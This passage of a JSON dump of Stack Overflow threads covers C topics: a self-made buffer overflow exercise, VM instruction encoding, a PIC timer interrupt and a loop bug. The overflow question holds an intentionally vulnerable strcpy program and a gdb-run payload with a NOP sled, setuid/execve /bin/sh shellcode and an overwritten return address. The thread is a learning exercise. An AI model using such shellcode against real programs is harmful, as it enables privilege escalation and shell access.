"https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1457566551, "post_id": 35904518, "comment_id": 59469962, "body": "OP is trying to exploit a vulnerability in an example program. Yes, it has bugs, and intentionally so."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457636133, "post_id": 35904518, "comment_id": 59508183, "body": "lets start with <code>argv[0]</code> is the name of the executable, not the first command line parameter."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457636493, "post_id": 35904518, "comment_id": 59508401, "body": "since you do not have the source code for <code>strcpy()</code> visible to <code>gdb</code>, you should just <code>next</code> over that function call rather than trying to step through it."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457636538, "post_id": 35904518, "comment_id": 59508425, "body": "the posted code is missing the statement: <code>#include &lt;string.h&gt;</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457637389, "post_id": 35904518, "comment_id": 59508920, "body": "when I step through the posted code (with no corrections) I get the message:  *** stack smashing detected ***: /home/rkwill/Documents/forum/untitled2 terminated  Program received signal SIGABRT, Aborted."}], "answers": [{"comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1457566108, "post_id": 35904657, "comment_id": 59469783, "body": "Or break on the strcpy call, with <code>break main.c:1234</code> (using the actual filename and line number instead of main.c and 1234)"}, {"owner": {"reputation": 311, "user_id": 5377424, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/eb8afc2f2a8519794f32c481abe2a792?s=128&d=identicon&r=PG&f=1", "display_name": "samuelk71", "link": "https://stackoverflow.com/users/5377424/samuelk71"}, "edited": false, "score": 0, "creation_date": 1457566367, "post_id": 35904657, "comment_id": 59469884, "body": "If I just plain run it with these arguments I get \ufffd\ufffd...\ufffd\ufffd1\ufffd\ufffd&#240;\u03401\ufffdRhn/shh//bi\ufffd\ufffdRS\ufffd\ufffd\ufffdB           aaaaaaaaaaaaaaaaaaaa\ufffd\ufffd\ufffd\ufffd degF is -17.8 degC Segmentation fault  for the ouput. But still the same user"}], "tags": [], "owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "is_accepted": true, "score": 1, "last_activity_date": 1457565653, "creation_date": 1457565653, "answer_id": 35904657, "question_id": 35904518, "link": "https://stackoverflow.com/questions/35904518/basic-buffer-overflow-with-strcpy/35904657#35904657", "title": "basic buffer overflow with strcpy", "body": "<p>You're just stepping inside of <code>strlen</code>, which is apparently implemented in assembly and not in C (likely for performance).</p>\n\n<p>Just keep stepping until you arrive back in <code>main</code>, or use <code>next</code> to step over the function call.</p>\n"}], "owner": {"reputation": 311, "user_id": 5377424, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/eb8afc2f2a8519794f32c481abe2a792?s=128&d=identicon&r=PG&f=1", "display_name": "samuelk71", "link": "https://stackoverflow.com/users/5377424/samuelk71"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 743, "favorite_count": 0, "accepted_answer_id": 35904657, "answer_count": 1, "score": 1, "last_activity_date": 1457565968, "creation_date": 1457565043, "last_edit_date": 1457565968, "question_id": 35904518, "link": "https://stackoverflow.com/questions/35904518/basic-buffer-overflow-with-strcpy", "title": "basic buffer overflow with strcpy", "body": "<p>I am reading here about basic buffer overflows: <a href=\"http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html\" rel=\"nofollow\">http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</a> . I thought I understood what was happening so I made my own program: </p>\n\n<pre><code>//vulnerable1.c\n#include &lt;stdio.h&gt;\n\n#define MAX_DEGF_SIZE 720\n\nint main(int argc, char* argv[])\n{\n    char degF[MAX_DEGF_SIZE];\n\n    if (argc == 2 &amp;&amp; strlen(argv[0]) &lt; MAX_DEGF_SIZE) {\n        strcpy(degF, argv[1]);\n    } else {\n        fprintf(stderr, \"degF to degC converter\\n\");\n        fprintf(stderr, \"Usage: %s &lt;degF&gt;\\n\", argv[0]);\n\n        return -1;\n    }\n}\n</code></pre>\n\n<p>Since the buffer size is 720, I tested how big the input would need to be. </p>\n\n<pre><code>./vulnerable1 `perl -e 'print \"A\"x728'`\nAA...AAA degF is -17.8 degC\n\n./vulnerable1 `perl -e 'print \"A\"x732'`\nAA...AA degF is -17.8 degC\nSegmentation fault\n</code></pre>\n\n<p>Here I see that I need at least 732 bytes. Next I disass main to see how many bytes have actually been reserved: </p>\n\n<pre><code>(gdb) disass main\nDump of assembler code for function main:\n   0x08048514 &lt;+0&gt;: push   %ebp\n   0x08048515 &lt;+1&gt;: mov    %esp,%ebp\n   0x08048517 &lt;+3&gt;: and    $0xfffffff0,%esp\n   0x0804851a &lt;+6&gt;: sub    $0x2f0,%esp\n</code></pre>\n\n<p>0x2f0 = 752. So the variable is padded by 20 bytes. Therefor, I need 756 bytes to start overwriting the saved ebp, and 760 bytes to to overwrite the return address. My stack breakdown is: \n<code>NOPS(704 bytes) + shellcode (32 bytes) + 'A's (20 bytes) + Return Address ( 4 bytes) = 760</code></p>\n\n<p>Now I try it out: </p>\n\n<pre><code>gdb -q vulnerable1\nReading symbols from /home/testUser/vulnerable1...done.\n(gdb) break main\nBreakpoint 1 at 0x8048520: file vulnerable1.c, line 11.\n(gdb) r `perl -e 'print \"\\x90\"x704, \"\\x31\\xc0\\x89\\xc3\\xb0\\x17\\xcd\\x80\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80\", \"a\"x20, \"\\xa0\\xfb\\xff\\xbf\"'`\nStarting program: /home/testUser/vulnerable1 `perl -e 'print \"\\x90\"x704, \"\\x31\\xc0\\x89\\xc3\\xb0\\x17\\xcd\\x80\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80\", \"a\"x20, \"\\xa0\\xfb\\xff\\xbf\"'`\n\nBreakpoint 1, main (argc=2, argv=0xbffff564) at vulnerable1.c:11\n11      if (argc == 2 &amp;&amp; strlen(argv[0]) &lt; MAX_DEGF_SIZE) {\n(gdb) step\n__strlen_sse2 () at ../sysdeps/i386/i686/multiarch/strlen.S:70\n70  ../sysdeps/i386/i686/multiarch/strlen.S: No such file or directory.\n    in ../sysdeps/i386/i686/multiarch/strlen.S\n(gdb) step\n73  in ../sysdeps/i386/i686/multiarch/strlen.S\n</code></pre>\n\n<p>What happens here? </p>\n"}, {"tags": ["c", "encoding", "instructions"], "comments": [{"owner": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457564389, "post_id": 35904352, "comment_id": 59469110, "body": "Note also that you might need to add <code>__attribute__((packed))</code> to <code>struct instr</code> to ensure there is no padding between the members. And <code>uint64_t</code> is 8 bytes, not 4 bytes. On the other hand you might also want to align the members for performance."}, {"owner": {"reputation": 321, "user_id": 5390350, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c8b06cc918ec6d69bdced77e9408e218?s=128&d=identicon&r=PG&f=1", "display_name": "mosmo", "link": "https://stackoverflow.com/users/5390350/mosmo"}, "reply_to_user": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457564473, "post_id": 35904352, "comment_id": 59469150, "body": "@jotik Oops my bad on that, and good point about packing the structure :)"}, {"owner": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457564691, "post_id": 35904352, "comment_id": 59469242, "body": "Btw, what do you mean by <i>&quot;into a single value&quot;</i>? An instance of <code>instr</code> would already be a single value. Why do you need this?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457564699, "post_id": 35904352, "comment_id": 59469247, "body": "The <code>immediate</code> field takes up 64 bits, so you&#39;re never going to get anything smaller than <code>72</code> bits."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1457564787, "post_id": 35904352, "comment_id": 59469271, "body": "Encoding as an array of <code>uint8_t</code> is one option. On the x86 family of processors, there is an arbitrary limit of 14 bytes per instruction. You could adopt a similar restriction, which would allow you to use a fixed sized array to store any instruction."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457564832, "post_id": 35904352, "comment_id": 59469287, "body": "Actually, the smallest will be 80 bits. 64 bits for <code>immediate</code>, 8 bits for <code>opcode</code>, and 8 bits for <code>target</code>. How do you think you could pack it better?"}, {"owner": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457564891, "post_id": 35904352, "comment_id": 59469303, "body": "One might be interested in bit-fields."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457564945, "post_id": 35904352, "comment_id": 59469337, "body": "You said <b>4 byte immediate value</b>. So why are you using <code>uint64_t</code> instead of <code>uint32_t</code>?"}, {"owner": {"reputation": 321, "user_id": 5390350, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c8b06cc918ec6d69bdced77e9408e218?s=128&d=identicon&r=PG&f=1", "display_name": "mosmo", "link": "https://stackoverflow.com/users/5390350/mosmo"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457565091, "post_id": 35904352, "comment_id": 59469409, "body": "@Barmar Forgot to correct that part, I meant I 8 byte... I want a 64 bit integer as an immediate, not a 32 bit integer."}, {"owner": {"reputation": 321, "user_id": 5390350, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c8b06cc918ec6d69bdced77e9408e218?s=128&d=identicon&r=PG&f=1", "display_name": "mosmo", "link": "https://stackoverflow.com/users/5390350/mosmo"}, "reply_to_user": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457565512, "post_id": 35904352, "comment_id": 59469567, "body": "@jotik Now I&#39;m not even sure what it means. I&#39;m thinking in a way that I could print it to a file, but I guess I would do that byte by byte how user3386109 suggested?"}, {"owner": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457566707, "post_id": 35904352, "comment_id": 59470018, "body": "@mosmo Yes, just take care of endianness for fields larger than 1 byte, then just <code>fwrite(&amp;someInstruction, sizeof(struct instr), 1u, outFile)</code> for each instruction."}, {"owner": {"reputation": 321, "user_id": 5390350, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c8b06cc918ec6d69bdced77e9408e218?s=128&d=identicon&r=PG&f=1", "display_name": "mosmo", "link": "https://stackoverflow.com/users/5390350/mosmo"}, "reply_to_user": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457607649, "post_id": 35904352, "comment_id": 59487819, "body": "@jotik Ah I see, perfect, thanks :)"}], "answers": [{"tags": [], "owner": {"reputation": 2080, "user_id": 4157487, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5d14df3ab7cb8c9e793b7d30ec3d740e?s=128&d=identicon&r=PG&f=1", "display_name": "George", "link": "https://stackoverflow.com/users/4157487/george"}, "is_accepted": false, "score": 0, "last_activity_date": 1457588882, "creation_date": 1457588882, "answer_id": 35908577, "question_id": 35904352, "link": "https://stackoverflow.com/questions/35904352/encoding-instructions-in-c/35908577#35908577", "title": "Encoding instructions in C", "body": "<p>You would encode it into a single value of type <code>struct instr</code>:</p>\n\n<pre><code>struct instr a = { ... };\n</code></pre>\n\n<p>The variable <code>a</code> is a value that you can assign to other variables of type <code>struct instr</code>, pass (by value) when calling a function, use as a return value of the function call, etc. <code>struct instr</code> is a type that has values just like built-in types (<code>int</code>, <code>long</code>, etc).</p>\n"}], "owner": {"reputation": 321, "user_id": 5390350, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c8b06cc918ec6d69bdced77e9408e218?s=128&d=identicon&r=PG&f=1", "display_name": "mosmo", "link": "https://stackoverflow.com/users/5390350/mosmo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 94, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1457588882, "creation_date": 1457564143, "last_edit_date": 1457565111, "question_id": 35904352, "link": "https://stackoverflow.com/questions/35904352/encoding-instructions-in-c", "title": "Encoding instructions in C", "body": "<p>Very new to this concept, and I've been referencing other instruction sets out there, but I've been trying to create a virtual machine where I actually encode the instructions.</p>\n\n<p>This is what I've got:</p>\n\n<pre><code>enum OPCODE {\n    MOV,\n};\n\nenum TARGET {\n    A, B,\n};\n\nstruct instr {\n    unsigned char opcode;\n    unsigned char target;\n    uint64_t immediate;\n};\n</code></pre>\n\n<p>Basically I have an instruction that has a 1 byte opcode, a 1 byte target, and a 8 byte immediate value. So for instance, a move instruction like: <code>MOV A, 50</code> that moves the value 50 into a will be 0, 0, 50 assuming that mov's opcode is 0, and the A register is 0.</p>\n\n<p>How would I go around encoding this into a single value? The instruction adds up to an 80 bit/10 byte value which, as far as I know, is not a native type in C. What type would I use, and to store this could I use a union to squash it all into a single value?</p>\n\n<p>... am I approaching this correctly at all?</p>\n"}, {"tags": ["c", "timer"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1457562855, "post_id": 35903973, "comment_id": 59468398, "body": "What&#39;s the question?"}, {"owner": {"reputation": 1, "user_id": 6041987, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-3lXnPTx3mUM/AAAAAAAAAAI/AAAAAAAAACw/7TGlqeeVe-k/photo.jpg?sz=128", "display_name": "Riley Donnelly", "link": "https://stackoverflow.com/users/6041987/riley-donnelly"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457563095, "post_id": 35903973, "comment_id": 59468524, "body": "This code has to be able to detect how long a push button is pressed, take that information, and display it on the LCD display."}, {"owner": {"reputation": 1, "user_id": 6041987, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-3lXnPTx3mUM/AAAAAAAAAAI/AAAAAAAAACw/7TGlqeeVe-k/photo.jpg?sz=128", "display_name": "Riley Donnelly", "link": "https://stackoverflow.com/users/6041987/riley-donnelly"}, "edited": false, "score": 0, "creation_date": 1457563277, "post_id": 35903973, "comment_id": 59468619, "body": "Ok, I do not understand how to implement my requirements. So my question is &#39;How do I implement the requirements?&#39;"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457563325, "post_id": 35903973, "comment_id": 59468645, "body": "What your code is doing? Does it work? No? What is not working?"}, {"owner": {"reputation": 1, "user_id": 6041987, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-3lXnPTx3mUM/AAAAAAAAAAI/AAAAAAAAACw/7TGlqeeVe-k/photo.jpg?sz=128", "display_name": "Riley Donnelly", "link": "https://stackoverflow.com/users/6041987/riley-donnelly"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457563554, "post_id": 35903973, "comment_id": 59468746, "body": "The code right now is counting in milliseconds as soon as the program boots and resets around 65 seconds. So it half works. I just need help modifying the code so it only counts when a button is pressed."}], "answers": [{"tags": [], "owner": {"reputation": 116, "user_id": 5938559, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-WbG4IYfnBbk/AAAAAAAAAAI/AAAAAAAAIT8/sD1wsgzpwlU/photo.jpg?sz=128", "display_name": "Aleksey Khivrenko", "link": "https://stackoverflow.com/users/5938559/aleksey-khivrenko"}, "is_accepted": false, "score": 0, "last_activity_date": 1457564538, "creation_date": 1457564538, "answer_id": 35904431, "question_id": 35903973, "link": "https://stackoverflow.com/questions/35903973/design-for-a-c-program-using-timer2-interrupts/35904431#35904431", "title": "Design for a C Program Using Timer2 Interrupts", "body": "<p>you need figure out how your button is connected to your microcontroller and declare that port in you main function. Make sure you are able to read the state of the port (i.e. button up or button down).</p>\n\n<p>Then it your IntServe interrupt check if the button is down, if it is increment <code>COUNTER</code>.</p>\n\n<p>The <code>COUNTER</code> is an integer, so it will only be able to count upto 65,535 ms (about 65 seconds), you may want to implement a second count variable for overflow, so that you can count button presses longer than 65 seconds.</p>\n"}], "owner": {"reputation": 1, "user_id": 6041987, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-3lXnPTx3mUM/AAAAAAAAAAI/AAAAAAAAACw/7TGlqeeVe-k/photo.jpg?sz=128", "display_name": "Riley Donnelly", "link": "https://stackoverflow.com/users/6041987/riley-donnelly"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 109, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457564538, "creation_date": 1457562549, "last_edit_date": 1457563217, "question_id": 35903973, "link": "https://stackoverflow.com/questions/35903973/design-for-a-c-program-using-timer2-interrupts", "title": "Design for a C Program Using Timer2 Interrupts", "body": "<p>I'm programming my C code onto a PIC board. My question is how to get my program to count how long a button (RB0) is pressed down. It then displays the time it took and display it on an LCD Display. It counts in ms. Below is my code so far.</p>\n\n<pre><code>    // Global Variables\nunsigned int COUNTER;\n// Subroutine Declarations\n#include &lt;pic18.h&gt;\n#include \"lcd_portd.c\"\n\n//LCD routine, modified from previous examples\nvoid LCD_Out(unsigned int STUFF, unsigned char A)\n{\n    unsigned char C[5], i;\n\n    for (i=0; i&lt;5; i++)\n    {\n        C[i] = STUFF % 10;\n        STUFF = STUFF / 10;\n    }\n\n    for (i=5; i&gt;0; i--)\n    {\n        if (i == A) LCD_Write('.');\n        LCD_Write(C[i-1] + '0');\n    }\n}\n\nvoid interrupt IntServe(void)\n{\n    if (TMR2IF)\n    {\n        RB0 = !RB0;\n        TMR2IF = 0;\n\n        COUNTER = COUNTER + 1;\n\n    }\n }\n\n\n// Main Routine\n\nvoid main(void)\n{\n    //Instantiate all Ports to ready for Timers and pin sets\n    LCD_Init();\n   TRISA = 0;\n   TRISB = 0;\n   TRISC = 0;\n   TRISD = 0;\n   TRISE = 0;\n   ADCON1 = 0x0F;\n   //Timer Interrupt for 1 ms, A = 9, C = 4, B = 250\n   //Which means PR2 = 249, and # is x1001101 = 0x4D\n   T2CON = 0x4D;\n   PR2 = 249;\n   TMR2IE = 1;\n   PEIE = 1;\n   TMR2ON = 1;\n   TMR2IP = 1;\n\n   GIE = 1;\n   // While Loop displays length of Wait through Counter\n   while(1)\n   {\n       LCD_Move(0,0);\n       LCD_Out(COUNTER,3);\n   }\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "loops"], "comments": [{"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "edited": false, "score": 1, "creation_date": 1457561896, "post_id": 35903783, "comment_id": 59467919, "body": "Please provide expected output and actual output."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1457562090, "post_id": 35903783, "comment_id": 59468031, "body": "Why should the sign matter at all? Why do you have these comparisons in your code? The whole algorithm should be a single loop with one assignment in it."}, {"owner": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "edited": false, "score": 0, "creation_date": 1457562809, "post_id": 35903783, "comment_id": 59468376, "body": "for the first set it works. like 10, 20, 30, 40 the output is 30,50,70,40. However when it uses -100, -200, -300, -400, -500. It should show -300 -500 -700 -900 -500 but mine just shows the original inputs. I have no algorithm as it is an online textbook that only takes code"}], "answers": [{"tags": [], "owner": {"reputation": 8573, "user_id": 1520907, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ef775a1d43b1bd7fe3882a2ea469136?s=128&d=identicon&r=PG&f=1", "display_name": "user123", "link": "https://stackoverflow.com/users/1520907/user123"}, "is_accepted": false, "score": 2, "last_activity_date": 1457562943, "last_edit_date": 1457562943, "creation_date": 1457562208, "answer_id": 35903895, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/35903895#35903895", "title": "Getting a for loop to work with negative numbers", "body": "<p>You made negative numbers an issue by adding that <code>if</code> condition inside the loop. It's redundant. You're just asked to take the array and transform it so that element <code>i</code> represents <code>a[i] + a[i+1]</code> in your original array. This doesn't require any sort of special handling for signs.</p>\n\n<p>Also, note that in your code, you're referring to element <code>i + 1</code> when this could potentially be an element beyond the bounds of the array (suppose <code>i = 3</code>). When you modify the code to loop correctly, be sure to avoid indexing outside the bounds of the array.</p>\n\n<p>You can completely avoid a check by using an appropriate condition in the <code>for</code> loop. Not only does <code>i</code> have to be less than  the size of the array, but <code>i+1</code> must satisfy this condition too.</p>\n"}, {"comments": [{"owner": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "edited": false, "score": 0, "creation_date": 1457563037, "post_id": 35903994, "comment_id": 59468496, "body": "How would I communicate that into code. This makes sense, and I know it has to do with my if statement, but I don&#39;t know how I could figure it out to do all numbers until the last one?"}, {"owner": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "reply_to_user": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "edited": false, "score": 0, "creation_date": 1457563124, "post_id": 35903994, "comment_id": 59468542, "body": "If you know the total size of your array, it should be easy to stop the loop at the last but one."}, {"owner": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "edited": false, "score": 0, "creation_date": 1457563191, "post_id": 35903994, "comment_id": 59468574, "body": "The book just generates the numbers and runs it through the code. I know no idea what the numbers will be until it passes the first set of numbers the book uses."}], "tags": [], "owner": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "is_accepted": false, "score": 1, "last_activity_date": 1457562626, "creation_date": 1457562626, "answer_id": 35903994, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/35903994#35903994", "title": "Getting a for loop to work with negative numbers", "body": "<p>Well the sum of two negatives bonus will be a greater negative bonus, so simply go ahead and add the numbers without bothering to check if they are negative or positive.</p>\n\n<p>Your loop should only run till the numbers you want to update. Since you do not need to update the last number, do not go there.<br>\nOther than that I think you are quite on track. </p>\n"}, {"tags": [], "owner": {"reputation": 116, "user_id": 5938559, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-WbG4IYfnBbk/AAAAAAAAAAI/AAAAAAAAIT8/sD1wsgzpwlU/photo.jpg?sz=128", "display_name": "Aleksey Khivrenko", "link": "https://stackoverflow.com/users/5938559/aleksey-khivrenko"}, "is_accepted": false, "score": 2, "last_activity_date": 1457563549, "creation_date": 1457563549, "answer_id": 35904205, "question_id": 35903783, "link": 